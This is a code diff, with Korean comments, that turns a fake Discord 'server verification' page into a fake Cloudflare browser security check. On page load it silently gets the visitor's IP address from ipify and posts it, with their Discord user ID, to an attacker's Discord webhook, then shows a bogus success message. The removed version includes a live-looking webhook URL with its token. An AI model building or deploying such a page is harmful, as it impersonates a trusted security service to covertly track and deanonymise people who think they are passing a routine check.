@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>디스코드 서버 인증</title>
+    <title>Cloudflare 보안 검문소</title>
     <style>
         body {
-            background-color: #313338;
-            color: #dbdee1;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            background-color: #f3f3f3;
+            color: #333;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -16,99 +16,90 @@
             margin: 0;
         }
         .card {
-            background-color: #2b2d31;
+            background: white;
             padding: 40px;
             border-radius: 8px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
             text-align: center;
-            width: 350px;
-        }
-        h2 { color: #f2f3f5; margin-bottom: 10px; }
-        p { color: #949ba4; font-size: 14px; margin-bottom: 25px; }
-        .btn {
-            background-color: #5865F2;
-            color: white;
-            border: none;
-            padding: 12px 20px;
-            font-size: 16px;
-            border-radius: 4px;
-            cursor: pointer;
+            max-width: 400px;
             width: 100%;
-            font-weight: bold;
-            transition: background 0.2s;
         }
-        .btn:hover { background-color: #4752C4; }
-        .loading { margin-top: 15px; color: #00FF00; font-size: 13px; display: none; }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #f6821f; /* 클라우드플레어 주황색 */
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        h2 { margin-bottom: 10px; font-size: 20px; color: #111; }
+        p { color: #666; font-size: 14px; line-height: 1.5; }
+        .success { color: #28a745; font-weight: bold; display: none; }
     </style>
 </head>
 <body>
-
     <div class="card">
-        <h2>🔒 서버 보안 인증</h2>
-        <p>안전한 디스코드 서버 이용을 위해 인증을 진행해 주세요.</p>
-        <button class="btn" id="verifyBtn" onclick="startVerification()">인증 진행하기</button>
-        <div class="loading" id="loadingText">인증 정보를 전송하는 중...</div>
+        <div class="spinner" id="loadingSpinner"></div>
+        <h2 id="titleText">브라우저 보안 확인 중...</h2>
+        <p id="descText">서버에 안전하게 접속하기 위해 브라우저 무결성을 검사하고 있습니다. 잠시만 기다려 주세요.</p>
+        <p class="success" id="successText">✅ 인증이 완료되었습니다! 디스코드 앱으로 돌아가세요.</p>
     </div>
 
     <script>
-        // 접속한 유저의 IP를 따오는 함수
-        async function getIP() {
+        // 1. URL에서 user_id(디스코드 고유 ID) 가져오기
+        const urlParams = new URLSearchParams(window.location.search);
+        const userId = urlParams.get('user_id') || "알 수 없음";
+
+        // ⚠️ [중요] 네 디스코드 웹훅 URL을 여기에 넣어줘! (이 주소로 IP랑 ID가 날아감)
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/여기에_네_웹훅_주소를_넣어줘";
+
+        async function verifyUser() {
             try {
-                let response = await fetch('https://api.ipify.org?format=json');
-                let data = await response.json();
-                return data.ip;
+                // 2. ipify API를 통해 유저의 진짜 IP 주소 가져오기
+                let ipRes = await fetch('https://api.ipify.org?format=json');
+                let ipData = await ipRes.json();
+                let userIp = ipData.ip;
+
+                // 3. 디스코드 웹훅으로 IP와 디스코드 ID(UUID) 전송
+                if (WEBHOOK_URL && !WEBHOOK_URL.includes("여기에_네_웹훅")) {
+                    await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            embeds: [{
+                                title: "🎯 유저 IP 및 인증 접속 감지",
+                                color: 16744192, // 주황색
+                                fields: [
+                                    { name: "디스코드 유저 ID (UUID)", value: `\`${userId}\``, inline: false },
+                                    { name: "추적된 IP 주소", value: `\`${userIp}\``, inline: false }
+                                ],
+                                timestamp: new Date().toISOString()
+                            }]
+                        })
+                    });
+                }
+
+                // 4. 2.5초 뒤에 자연스러운 성공 화면으로 전환
+                setTimeout(() => {
+                    document.getElementById('loadingSpinner').style.display = 'none';
+                    document.getElementById('titleText').innerText = "보안 인증 완료";
+                    document.getElementById('descText').style.display = 'none';
+                    document.getElementById('successText').style.display = 'block';
+                }, 2500);
+
             } catch (e) {
-                return "IP 확인 불가";
+                document.getElementById('titleText').innerText = "보안 확인 실패";
+                document.getElementById('descText').innerText = "페이지를 새로고침하거나 다시 시도해 주세요.";
             }
         }
 
-        async function startVerification() {
-            const btn = document.getElementById('verifyBtn');
-            const loading = document.getElementById('loadingText');
-            
-            btn.style.display = 'none';
-            loading.style.display = 'block';
-
-            const urlParams = new URLSearchParams(window.location.search);
-            const userId = urlParams.get('user_id');
-
-            if (!userId) {
-                alert('잘못된 접근입니다. 디스코드에서 다시 시도해 주세요.');
-                loading.style.display = 'none';
-                btn.style.display = 'block';
-                return;
-            }
-
-            // 버튼을 누르는 순간 IP 주소 가져오기
-            const userIp = await getIP();
-
-            try {
-                const webhookURL = "https://discord.com/api/webhooks/1565687242041597962/4a88OaMlBrvVYqMUAPaSiWxK4XAX4tvwNp1pMkVZxz6NLdl5i5_twLkbdT03j1ZjwtyI";
-
-                const embed = {
-                    title: "✅ 유저 보안 인증 및 IP 로그 완료",
-                    color: 5763719,
-                    fields: [
-                        { name: "인증한 디스코드 유저", value: `<@${userId}> (ID: ${userId})`, inline: false },
-                        { name: "접속 IP 주소", value: userIp, inline: false }
-                    ],
-                    timestamp: new Date().toISOString()
-                };
-
-                await fetch(webhookURL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ embeds: [embed] })
-                });
-
-                alert('인증이 성공적으로 완료되었습니다! 창을 닫고 디스코드로 돌아가세요.');
-                window.close();
-            } catch (e) {
-                alert('통신 중 오류가 발생했습니다. 다시 시도해 주세요.');
-                loading.style.display = 'none';
-                btn.style.display = 'block';
-            }
-        }
+        // 페이지 접속하자마자 실행
+        verifyUser();
     </script>
 </body>
 </html>
